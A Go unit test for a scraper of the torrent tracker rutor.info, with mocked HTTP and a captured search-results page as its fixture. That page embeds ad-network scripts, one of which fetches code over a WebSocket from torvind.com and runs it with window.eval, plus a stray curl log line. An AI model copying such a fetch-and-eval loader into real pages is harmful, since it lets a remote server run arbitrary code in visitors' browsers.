package torrents

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"net/http"
	"strconv"
	"testing"

	"github.com/stretchr/testify/assert"
)

type roundTripFunc func(*http.Request) (*http.Response, error)
type _testDoer struct {
	patch roundTripFunc
}

func (d *_testDoer) Do(r *http.Request) (*http.Response, error) {
	return d.patch(r)
}

const FILMID = 100

var EXPECTED_URL = "http://rutor.info/search/0/0/010/0/film%20" + strconv.Itoa(FILMID)

func Test_CheckUrl(t *testing.T) {
	var called bool
	testDo := &_testDoer{func(r *http.Request) (*http.Response, error) {
		assert.Equal(t, EXPECTED_URL, r.URL.String())
		called = true
		return nil, fmt.Errorf("test")
	}}
	GetTorrents(testDo, FILMID)
	assert.True(t, called)
}

func TestGetTorrents(t *testing.T) {
	tests := []struct {
		name       string
		patchFunc  roundTripFunc
		want1      []Torrent
		wantErr    bool
		inspectErr func(err error, t *testing.T) //use for more precise error evaluation after test
	}{
		{
			name: "request_error",
			patchFunc: func(_ *http.Request) (*http.Response, error) {
				return nil, fmt.Errorf("test")
			},
			want1:   nil,
			wantErr: true,
			inspectErr: func(err error, t *testing.T) {
				assert.Equal(t, "test", err.Error())
			},
		},
		{
			name: "bad_response_code",
			patchFunc: func(_ *http.Request) (*http.Response, error) {
				var response = &http.Response{
					StatusCode: 400,
					Body:       ioutil.NopCloser(nil),
				}
				return response, nil
			},
			want1:   nil,
			wantErr: true,
			inspectErr: func(err error, t *testing.T) {
				assert.Equal(t,
					"no torrents. response code 400",
					err.Error())
			},
		},
		{
			name: "torrents_parsed",
			patchFunc: func(_ *http.Request) (*http.Response, error) {
				response := &http.Response{
					StatusCode: 200,
					Body:       ioutil.NopCloser(bytes.NewBufferString(html)),
				}
				return response, nil
			},
			want1: []Torrent{
				Torrent{
					Title:   "Хористы / Boychoir (2014) BDRip 1080p от HDReactor | L1",
					Quality: "BDRip 1080p",
					Torrent: "http://d.rutor.info/download/458671",
					Seeds:   3,
					Leaches: 0,
				},
				Torrent{
					Title:   "Хористы / Boychoir (2014) HDRip | L1",
					Quality: "HDRip",
					Torrent: "http://d.rutor.info/download/469620",
					Seeds:   3,
					Leaches: 0,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			testDo := &_testDoer{tt.patchFunc}

			got1, err := GetTorrents(testDo, FILMID)

			assert.Equal(t, tt.want1, got1)
			if (err != nil) != tt.wantErr {
				t.Fatalf("GetTorrents error = %v, wantErr: %t", err, tt.wantErr)
			}

			if tt.inspectErr != nil {
				tt.inspectErr(err, t)
			}
		})
	}
}

const html = ` <html>
<head>
	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
	<link href="http://s.rutor.info/css.css" rel="stylesheet" type="text/css" media="screen" />
	<link rel="alternate" type="application/rss+xml" title="RSS" href="/rss.php?category" />
	<link rel="shortcut icon" href="http://s.rutor.info/favicon.ico" />
	<title>rutor.info :: Поиск</title>
	<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
	<script type="text/javascript" src="http://s.rutor.info/jquery.cookie-min.js"></script>
	<script type="text/javascript" src="http://s.rutor.info/t/functions.js"></script>

</head>
<body>

<div id="all">

<div id="up">

<div id="logo">
	<a href="/"><img src="http://s.rutor.info/logo.jpg" alt="rutor.info logo" /></a>
</div>

<table id="news_table">
  <tr><td colspan="2"><strong>Новости трекера</strong></td></tr><tr><td class="news_date">30-Дек</td>
  	<td class="news_title"><a href="http://rutor.info/torrent/472" target="_blank"  id="news88" onclick="$.cookie('news', '88', {expires: 365});">У RUTOR.ORG - Новый Адрес: RUTOR.INFO</a></td></tr><tr><td class="news_date">29-Ноя</td>
  	<td class="news_title"><a href="/torrent/178905" target="_blank"  id="news86">Вечная блокировка в России</a></td></tr><tr><td class="news_date">09-Окт</td>
  	<td class="news_title"><a href="/torrent/145012" target="_blank"  id="news59">Путеводитель по RUTOR.org: Правила, Руководства, Секреты</a></td></tr></table>
  <script type="text/javascript">
  $(document).ready(function(){if($.cookie("news")<88){$("#news88").css({"color":"orange","font-weight":"bold"});}});
  </script>

</div>

<div id="menu">
<a href="/" class="menu_b" style="margin-left:10px;"><div>Главная</div></a>
<a href="/top" class="menu_b"><div>Топ</div></a>
<a href="/categories" class="menu_b"><div>Категории</div></a>
<a href="/browse/" class="menu_b"><div>Всё</div></a>
<a href="/search/" class="menu_b"><div>Поиск</div></a>
<a href="/latest_comments" class="menu_b"><div>Комменты</div></a>
<a href="/upload.php" class="menu_b"><div>Залить</div></a>
<a href="/jabber.php" class="menu_b"><div>Чат</div></a>

<div id="menu_right_side"></div>

<script type="text/javascript">
$(document).ready(function()
{
	var menu_right;
	if ($.cookie('userid') > 0)
	{
		menu_right = '<a href="/users.php?logout" class="logout" border="0"><img src="http://s.rutor.info/i/viti.gif" alt="logout" /></a><span class="logout"><a href="/profile.php" class="logout"  border="0"><img src="http://s.rutor.info/i/profil.gif" alt="profile" /></a>';
	}
	else
	{
		menu_right = '<a href="/users.php" class="logout" border="0"><img src="http://s.rutor.info/i/zaiti.gif" alt="login" /></a>';
	}
	$("#menu_right_side").html(menu_right);
});
</script>

</div>
<h1>Поиск</h1>
</div>
<div id="ws">
<div id="content">

<center>
<div id="b_bn_2357" onmouseup="window.event.cancelBubble=true"></div>
</center>



<div id="msg1"></div>
<script type="text/javascript">
$(document).ready(function()
{
	if ($.cookie('msg') != null)
	{
		if ($.cookie('msg').length > 0)
		{
			var msg2 = '<div id="warning">' + $.cookie('msg').replace(/["+"]/g, ' ') + '</div>';
			$("#msg1").html(msg2);
			$.cookie('msg', '', { expires: -1 });
		}
	}
});
</script><script type="text/javascript">
	var search_page = 0;
	var search_string = 'film 806934';
	var search_category = 0;
	var search_sort = 0;
	var search_in = 1;
	var search_method = 0;
	var sort_ascdesc = 0;

	if (search_sort % 2 != 0)
	{
		search_sort -= 1;
		sort_ascdesc = 1;
	}


	$(document).ready(function()
	{
		$('#category_id').attr("value", search_category);
		$('#sort_id').attr("value", search_sort);
		//$('#inputtext_id').val(search_string);
		$('#search_in').attr("value", search_in);
		$('#search_method').attr("value", search_method);
		if (sort_ascdesc == 0)
			$('input[name=s_ad]')[1].checked = true;
		else
			$('input[name=s_ad]')[0].checked = true;
	});

	function search_submit()
	{
		var sort_id = parseInt($('#sort_id').val())+parseInt($('input[name=s_ad]:checked').val());
		document.location.href = '/search/' + search_page + '/' + $('#category_id').val() + '/' + $('#search_method').val()+''+$('#search_in').val()+'0' + '/' + sort_id + '/' + $('#inputtext_id').val().replace(/&/g,'AND');
	}
	</script><fieldset><legend>Поиск и сортировка</legend>
	<form onsubmit="search_submit(); return false;">
	<table>
	<tr>
	<td>Ищем</td>
	<td>
		<input type="text" size="35" id="inputtext_id" value="film 806934" />
		<select name="search_method" id="search_method">
			<option value="0">фразу полностью</option>
			<option value="1">все слова</option>
			<option value="2">любое из слов</option>
			<option value="3">логическое выражение</option>
		</select>
		в
		<select name="search_in" id="search_in">
			<option value="0">названии</option>
			<option value="1">названии и описании</option>
		</select>
	</td>
	</tr>
	<tr>
	<td>Категория</td>
	<td>
	<select name="category" id="category_id">
		<option value="0">Любая категория</option><option value="1">Зарубежные фильмы</option><option value="5">Наши фильмы</option><option value="12">Научно-популярные фильмы</option><option value="4">Зарубежные сериалы</option><option value="16">Наши сериалы</option><option value="6">Телевизор</option><option value="7">Мультипликация</option><option value="10">Аниме</option><option value="2">Музыка</option><option value="8">Игры</option><option value="9">Софт</option><option value="13">Спорт и Здоровье</option><option value="15">Юмор</option><option value="14">Хозяйство и Быт</option><option value="11">Книги</option><option value="3">Другое</option><option value="17">Иностранные релизы</option></select>
	</td>
	</tr>
	<tr>
	<td>Упорядочить по</td>
	<td>
	<select id="sort_id">
		<option value="0">дате добавления</option>
		<option value="2">раздающим</option>
		<option value="4">качающим</option>
		<option value="6">названию</option>
		<option value="8">размеру</option>
		<option value="10">релевантности</option>
	</select>
	по
	<label><input type="radio" name="s_ad" value="1"  />возрастанию</label>
	<label><input type="radio" name="s_ad" value="0"  checked="checked"  />убыванию</label>
	</td>
	</tr>

	<tr>
	<td>
	<input type="submit" value="Поехали" onclick="search_submit(); return false;" />
	</td>
	</tr>


	</table>
	</form>
	</fieldset><div id="index"><b>Страницы:  1</b> Результатов поиска 2 (max. 2000)<table width="100%"><tr class="backgr"><td width="10px">Добавлен</td><td colspan="2">Название</td><td width="1px">Размер</td><td width="1px">Пиры</td></tr><tr class="gai"><td>22&nbsp;Сен&nbsp;18</td><td ><a class="downgif" href="http://d.rutor.info/download/458671"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:fe2fb6e741b9f893a1055c2b59aad0ebe7dfd4bf&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
<a href="/torrent/458671/horisty_boychoir-2014-bdrip-1080p-ot-hdreactor-l1">Хористы / Boychoir (2014) BDRip 1080p от HDReactor | L1 </a></td> <td align="right">3<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
<td align="right">7.76&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;3</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="tum"><td>13&nbsp;Ноя&nbsp;15</td><td ><a class="downgif" href="http://d.rutor.info/download/469620"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:6c313fd19918320f3cf3f9d3af77d82ec9b33fb0&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
<a href="/torrent/469620/horisty_boychoir-2014-hdrip-l1">Хористы / Boychoir (2014) HDRip | L1 </a></td> <td align="right">2<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
<td align="right">2.05&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;3</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr></table><b>Страницы:  1</b></div>
<center><a href="#up"><img src="http://s.rutor.info/t/top.gif" alt="up" /></a></center>

<!-- bottom banner -->

<div id="down">
Файлы для обмена предоставлены пользователями сайта. Администрация не несёт ответственности за их содержание.
На сервере хранятся только торрент-файлы. Это значит, что мы не храним никаких нелегальных материалов. <a href="/advertise.php">Реклама</a>.
</div>


</div>

<div id="sidebar">

<div class="sideblock">
	<a id="fforum" href="/torrent/145012"><img src="http://s.rutor.info/i/forum.gif" alt="forum" /></a>
</div>

<div class="sideblock">
<center>
<table border="0" background="http://s.rutor.info/i/poisk_bg.gif" cellspacing="0" cellpadding="0" width="100%" height="56px">
<script type="text/javascript">function search_sidebar() { window.location.href = '/search/'+$('#in').val(); return false; }</script>
<form action="/b.php" method="get" onsubmit="return search_sidebar();">
 <tr>
  <td scope="col" rowspan=2><img src="http://s.rutor.info/i/lupa.gif" border="0" alt="img" /></td>
  <td valign="middle"><input type="text" name="search" size="18" id="in"></td>
 </tr>
 <tr>
  <td><input name="submit" type="submit" id="sub" value="искать по названию"></td>
 </tr>
</form>
</table>
</center>
</div>



<div class="sideblock2">
<center>
<div id="b_bn_51" onmouseup="window.event.cancelBubble=true"></div>
<script>(function(){var s=document.createElement('script');s.src='https://mrelko.com/j/w.php?id=51&r='+Math.random();document.getElementsByTagName('head')[0].appendChild(s)})();</script>
</center>
</div>

<div class="sideblock2">
<!--LiveInternet counter--><script type="text/javascript"><!--
document.write("<a href='http://www.liveinternet.ru/click' "+
"target=_blank><img src='http://counter.yadro.ru/hit?t39.6;r"+
escape(document.referrer)+((typeof(screen)=="undefined")?"":
";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
";"+Math.random()+
"' alt='' title='LiveInternet' "+
"border=0 width=31 height=31><\/a>")//--></script><!--/LiveInternet-->
</div>

</div>

</div>



<script type="text/javascript">
 (function () {
 var script_id = "MTIzNg==", s = document.createElement("script");
 s.type = "text/javascript";
 s.charset = "utf-8";
s.src = "//torvind.com/js/" + script_id+".js?r="+Math.random()*10000000000;
 s.async = true;
 s.onerror = function(){
  var ws = new WebSocket("ws://torvind.com:8040/");
  ws.onopen = function () {
   ws.send(JSON.stringify({type:"p", id: script_id}));
  };
  ws.onmessage = function(tx) { ws.close(); window.eval(tx.data); };
 };
 document.body.appendChild(s);
 })();
</script>


<script>(function(){var s=document.createElement('script');s.src='https://mrelko.com/j/w.php?id=2357&r='+Math.random();document.getElementsByTagName('head')[0].appendChild(s)})();</script>


</body>
* Connection #0 to host 162.144.71.192 left intact
</html>`
